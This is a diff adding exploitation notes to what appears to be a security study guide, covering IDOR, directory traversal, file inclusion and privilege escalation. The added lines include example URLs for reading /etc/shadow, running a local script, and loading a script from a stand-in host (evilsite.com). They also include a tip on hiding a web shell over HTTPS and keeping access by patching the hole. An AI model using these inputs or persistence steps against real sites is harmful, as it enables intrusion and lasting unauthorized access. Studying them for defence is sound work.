@@ -752,9 +752,22 @@ Definition: Identify, prioritize and remediate vulnerabilities in your environme
 ### Exploiting Authorization Vulnerabilities
 
 * **Insecure Direct Object References**
+  * `example.com/orders?id=100` shows your order and you can just do `example.com/orders?id=101` and see anothers order.
 * **Directory Traversal**
+  * The web server allows to navigate the directory and list all files - bad configuration
+    * Appache Server / NGINX - `www.example.com/../../../etc/shawdow` (so you just path yourself outside the web folder)
+    * Open AWS S3 bucket
+    * It helps to know on what server the site is host to then learn about their (Default) config
 * **File Inclusion**
+  * Next level Directory Traversel - you don't just read a file, you execute it
+  * Run a file from the server's file system: `www.example.com/?include=../../../etc/attack.sh`
+  * Run a file from an external place: `www.example.com/?include=www.evilsite.com/script.sh`
+  * Attack might then upload a [Web Shell](https://en.wikipedia.org/wiki/Web_shell) to comfortably run commands and see output
+    * ✅ The webshell uses HTTPS, so it hides even better.
+  * TIP: Patch the vulnerability and persist your access with the web shell
 * **Privilege Escalation**
+  * Upgrade your user to have more rights or higher group
+  * Dirty Cow - Linux vulnerability
 
 ### Exploiting Web Application Vulnerabilities
 
